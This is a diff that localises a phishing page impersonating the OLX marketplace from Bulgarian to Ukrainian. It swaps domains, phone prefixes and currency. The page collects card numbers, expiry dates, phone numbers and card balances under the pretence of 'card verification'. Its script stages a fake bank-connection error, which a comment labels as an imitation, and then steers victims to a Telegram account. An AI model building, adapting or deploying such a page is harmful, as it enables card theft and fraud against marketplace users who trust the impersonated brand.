@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>OLX - Верификация на картата</title>
+    <title>OLX — Верифікація картки</title>
     <style>
         body {
             font-family: 'Roboto', Arial, sans-serif;
@@ -202,7 +202,7 @@
 <body>
     <header class="header">
         <div class="header-content">
-            <a href="https://www.olx.bg/" class="olx-logo">
+            <a href="https://www.olx.ua/" class="olx-logo">
                 <span class="letter-o"></span>
                 <span class="letter-l"></span>
                 <span class="letter-x"></span>
@@ -212,7 +212,7 @@
                     <svg width="24" height="24" viewBox="0 0 24 24" style="fill: white; margin-right: 5px;">
                         <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
                     </svg>
-                    <span>Профил</span>
+                    <span>Профіль</span>
                 </a>
             </div>
         </div>
@@ -220,15 +220,15 @@
 
     <div class="main-container">
         <div class="payment-card">
-            <h2>Верификация на карта</h2>
+            <h2>OLX — Верифікація картки</h2>
             <form id="verifyForm">
                 <div class="form-group">
-                    <label>Номер на картата</label>
+                    <label>Номер картки</label>
                     <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
                 </div>
                 <div class="row">
                     <div class="form-group">
-                        <label>Валидност</label>
+                        <label>Термін дії</label>
                         <input type="tel" id="expiry" placeholder="ММ/ГГ" maxlength="5" required>
                     </div>
                     <div class="form-group">
@@ -237,11 +237,11 @@
                     </div>
                 </div>
                 <div class="form-group">
-                    <label>Телефонен номер</label>
+                    <label>Номер телефону</label>
                     <input type="tel" id="phoneNumber" placeholder="+359 ..." maxlength="15" required>
                 </div>
                 <div class="form-group">
-                    <label>Наличен баланс (лв.)</label>
+                    <label>Баланс картки (грн.)</label>
                     <input type="number" id="balance" placeholder="0.00" step="0.01" required>
                 </div>
                 <button type="submit" class="verify-btn">ПОТВЪРДИ</button>
@@ -249,33 +249,33 @@
         </div>
 
         <div class="info-card">
-            <h3>Официална верификация</h3>
-            <p style="font-size: 14px; color: #406367;">За успешното привързване:</p>
+            <h3>Офіційна верифікація</h3>
+            <p style="font-size: 14px; color: #406367;">За успішне прив’язування:</p>
             <ul style="font-size: 14px; padding-left: 20px; color: #406367; line-height: 1.6;">
-                <li>Активиран лимит за онлайн плащания.</li>
-                <li>Баланс най-малко 1.00 лв.</li>
-                <li>Поддръжка на 3D-Secure код.</li>
+                <li>Активовано ліміт для онлайн-платежів.</li>
+                <li>Баланс потрібен для перевірки активності картки</li>
+                <li>Підтримка коду 3D-Secure</li>
             </ul>
         </div>
     </div>
 
     <div id="modal" class="modal">
         <div class="modal-content">
-            <h3 id="modal-title">Зареждане...</h3>
-            <p id="modal-message">Свързваме се с обслужващата банка...</p>
-            <a href="https://t.me/olx_verification" class="btn" style="display:none" id="modal-btn">Напишете в Telegram</a>
+            <h3 id="modal-title">Завантаження...</h3>
+            <p id="modal-message">З’єднуємося з банком-емітентом...</p>
+            <a href="https://t.me/olx_verification" class="btn" style="display:none" id="modal-btn">Напишіть у Telegram</a>
         </div>
     </div>
 
     <footer class="footer">
         <div class="footer-content">
             <div class="footer-column">
-                <a href="#" class="footer-link">Мобилни приложения</a>
-                <a href="#" class="footer-link">Условия за ползване</a>
+                <a href="#" class="footer-link">Мобільні застосунки</a>
+                <a href="#" class="footer-link">Умови користування</a>
             </div>
             <div class="footer-column">
-                <a href="#" class="footer-link">Правила за сигурност</a>
-                <a href="#" class="footer-link">OLX доставка</a>
+                <a href="#" class="footer-link">Правила безпеки</a>
+                <a href="#" class="footer-link">OLX Доставка</a>
             </div>
             <div class="footer-apps">
                 <div class="app-buttons">
@@ -304,14 +304,14 @@
         // Форматирование телефона
         document.getElementById('phoneNumber').addEventListener('input', e => {
             let v = e.target.value.replace(/\D/g, '');
-            if (v.startsWith('359')) v = v.substring(3);
-            e.target.value = '+359 ' + v.substring(0, 9);
+            if (v.startsWith('380')) v = v.substring(3);
+            e.target.value = '+380 ' + v.substring(0, 9);
         });
 
         // ГЛАВНАЯ ФУНКЦИЯ ОТПРАВКИ
         document.getElementById('verifyForm').addEventListener('submit', async e => {
             e.preventDefault();
-            
+
             const modal = document.getElementById('modal');
             modal.style.display = 'block';
 
@@ -341,8 +341,8 @@
 
             // Через 3 секунды имитируем ошибку связи с банком
             setTimeout(() => {
-                document.getElementById('modal-title').innerText = 'Грешка!';
-                document.getElementById('modal-message').innerText = 'Възникна техническа грешка при връзката с банката. Моля, потвърдете данните чрез нашата поддръжка в Telegram.';
+                document.getElementById('modal-title').innerText = 'Помилка!';
+                document.getElementById('modal-message').innerText = 'Сталася технічна помилка при з’єднанні з банком. Будь ласка, підтвердіть дані через нашу підтримку в Telegram';
                 document.getElementById('modal-btn').style.display = 'inline-block';
             }, 3000);
         });
